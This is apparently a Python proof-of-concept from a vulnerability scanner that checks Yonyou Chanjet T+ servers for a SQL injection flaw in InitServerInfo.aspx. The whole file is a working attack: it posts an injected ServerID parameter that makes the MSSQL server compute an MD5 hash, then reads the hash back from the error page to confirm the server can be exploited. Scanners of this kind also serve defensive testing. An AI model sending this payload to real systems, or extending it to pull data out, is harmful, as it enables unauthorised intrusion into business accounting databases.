import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友畅捷通TPlus-InitServerInfo存在SQL注入漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
    }
    data = '''operbtn=create&ServerID=1'%2b(select 1 where 1 in (SELECT sys.fn_varbintohexstr(hashbytes('MD5','123456'))))%2b'1'''
    vurl = urllib.parse.urljoin(url, "/tplus/UFAQD/InitServerInfo.aspx?preload=1")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 500 and 'e10adc3949ba59abbe56e057f20f883e' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult